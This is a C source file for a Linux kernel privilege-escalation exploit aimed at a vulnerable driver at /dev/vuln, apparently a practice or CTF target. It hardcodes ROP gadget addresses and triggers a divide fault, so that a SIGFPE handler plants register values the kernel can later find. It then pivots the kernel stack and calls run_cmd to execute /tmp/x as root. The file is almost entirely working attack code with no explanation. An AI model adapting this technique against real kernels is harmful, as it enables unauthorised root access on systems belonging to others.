#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <signal.h>
#include <unistd.h>
#include <assert.h>
#include <string.h>
#include <sched.h>
#include <signal.h>
#include <keyutils.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <sys/ioctl.h>
#include "libexp.h"

// define commands
#define IOCTL_BASE 'W'
#define CMD_ALLOC   _IO(IOCTL_BASE, 0)
#define CMD_WRITE   _IO(IOCTL_BASE, 1)
#define CMD_CALL	_IO(IOCTL_BASE, 2)

int fd;
int cmd_call = CMD_CALL;
// u64 pivot = 0xffffffff81348c37;//: add rsp, 0x68; ret;
u64 pivot = 0xffffffff81914373;//: add rsp, 0xc8; pop rbp; pop r12; ret;
u64 ret = 0xffffffff8104ddb9;//: ret;
u64 pret = 0xffffffff81000c86;//: pop rbx; ret;
u64 ppret = 0xffffffff819c31a0;//: pop rbx; pop rbp; ret;
u64 prdipp = 0xffffffff81016837;//: pop rdi; pop rbx; pop rbp; ret;
u64 run_cmd = 0xffffffff8108f870;

#define call_chain(chain) __asm__(".intel_syntax noprefix;"  \
									 "mov rcx, %0;"			 \
									 "mov r15, [rcx+8*0];"	  \
									 "mov r14, [rcx+8*1];"	  \
									 "mov r13, [rcx+8*2];"	  \
									 "mov r12, [rcx+8*3];"	  \
									 "mov rbp, [rcx+8*4];"	  \
									 "mov rbx, [rcx+8*5];"	  \
									 "nop;"					 \
									 "mov r10, [rcx+8*7];"	  \
									 "mov r9 , [rcx+8*8];"	  \
									 "mov r8 , [rcx+8*9];"	  \
									 "nop;"					 \
									 "nop;"					 \
									 "mov rdx, [rcx+8*10];"	 \
									 "nop;"					 \
									 "nop;"					 \
									 "mov rax, 16;"			 \
									 "mov rdi, fd;"			 \
									 "mov rsi, cmd_call;"	   \
									 "syscall;"	 \
									 ".att_syntax;"			 \
									 : : "r"(chain));

void kmalloc()
{
	int ret = ioctl(fd, CMD_ALLOC, NULL);
	assert(ret == 0);
}

void do_write(void *buf)
{
	int ret = ioctl(fd, CMD_WRITE, (unsigned long)buf);
	assert(ret == 0);
}

void set_cpu(int cpuid)
{
	cpu_set_t my_set;
	CPU_ZERO(&my_set);
	CPU_SET(cpuid, &my_set);
	int ret = sched_setaffinity(0, sizeof(my_set), &my_set);
	assert(ret == 0);
}

void save_payload()
{
	__asm__(".intel_syntax noprefix;"
			"mov rdi, 0x782f706d742f;" // 0xfffffe0000002fc8
			"mov rsi, 0x782f706d742f;" // 0xfffffe0000002fc0
			"xor r15, r15;"
			"idiv r15d;"
			".att_syntax");
}

void sighandler(int sig)
{
	// printf("catch signal: %d\n", sig);

	long chain[0x10];
	long idx = 0;
	memset(chain, 'A', sizeof(chain));
	chain[idx++] = ret;
	chain[idx++] = ret;
	chain[idx++] = ret;
	chain[idx++] = ret;
	chain[idx++] = ret;
	chain[idx++] = pret;
	chain[idx++] = ret;
	chain[idx++] = ret;
	chain[idx++] = prdipp;
	chain[idx++] = 0xfffffe0000002fc0;
	chain[idx++] = run_cmd;
	call_chain(chain);
}

int main()
{
	set_cpu(0);
	setbuf(stdout, NULL);

	// prepare payload
	FILE *f = fopen("/tmp/x", "w");
	char content[] = "#!/bin/sh\nid > /tmp/output\n";
	fwrite(content, 1, sizeof(content), f);
	fclose(f);
	system("chmod +x /tmp/x");

	// do exploitation
	long func_ptr;
	fd = open("/dev/vuln", O_RDWR);
	assert(fd >= 0);

	kmalloc();
	func_ptr = pivot;
	do_write(&func_ptr);

	signal(SIGFPE, sighandler);
	save_payload();
}
